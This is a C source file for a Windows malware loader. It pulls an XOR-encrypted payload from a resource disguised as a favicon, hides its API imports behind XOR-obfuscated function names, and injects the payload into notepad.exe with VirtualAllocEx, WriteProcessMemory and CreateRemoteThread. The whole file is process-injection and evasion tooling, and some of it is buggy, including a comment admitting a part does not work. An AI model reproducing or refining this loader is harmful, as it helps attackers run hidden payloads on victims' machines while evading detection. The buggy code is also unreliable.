#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"

BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
HANDLE (WINAPI * pOpenProcess)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
LPVOID (WINAPI * pVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
	data[data_len] = '\0'; // Null-terminate the decrypted data
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

  
        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;

	char key[] = "password";
	//para las funciones usar claves mas largas
	char skey [] = "ABCDEFGHIJKLMNOPRSTUWVYZAAAAAAAAA";
	
	int pid = 0;
    HANDLE hProc = NULL;

	unsigned char sOpenProcess [] = { 0xe, 0x32, 0x26, 0x2a, 0x15, 0x34, 0x28, 0x2b, 0x2c, 0x39, 0x38 };
	unsigned char sVirtualAllocEx [] = { 0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x9, 0x25, 0x26, 0x24, 0x2f, 0x8, 0x36 };
	unsigned char sWriteProcessMemory [] = { 0x16, 0x30, 0x2a, 0x30, 0x20, 0x16, 0x35, 0x27, 0x2a, 0x2f, 0x38, 0x3f, 0x0, 0x2b, 0x22, 0x3f, 0x20, 0x2a };
	unsigned char sCreateRemoteThread [] = { 0x2, 0x30, 0x26, 0x25, 0x31, 0x23, 0x15, 0x2d, 0x24, 0x25, 0x3f, 0x29, 0x19, 0x26, 0x3d, 0x35, 0x33, 0x37 };

	XOR((char *) sOpenProcess, sizeof(sOpenProcess), skey, sizeof(skey));
	XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), skey, sizeof(skey));
	XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), skey, sizeof(skey));
	XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), skey, sizeof(skey));
	
	//this does not work
	pOpenProcess = GetProcAddress(GetModuleHandle("kernel32.dll"), sOpenProcess);
	pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
	pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
	pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	
	// Decrypt (DeXOR) the payload
	XOR((char *) payload, payload_len, key, sizeof(key));

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			LPVOID pRemoteCode = NULL;
			HANDLE hThread = NULL;

	  
			pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
			pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
			
			hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
			if (hThread != NULL) {
					WaitForSingleObject(hThread, 500);
					CloseHandle(hThread);
					return 0;
			}
			return -1;
		}
	}
}
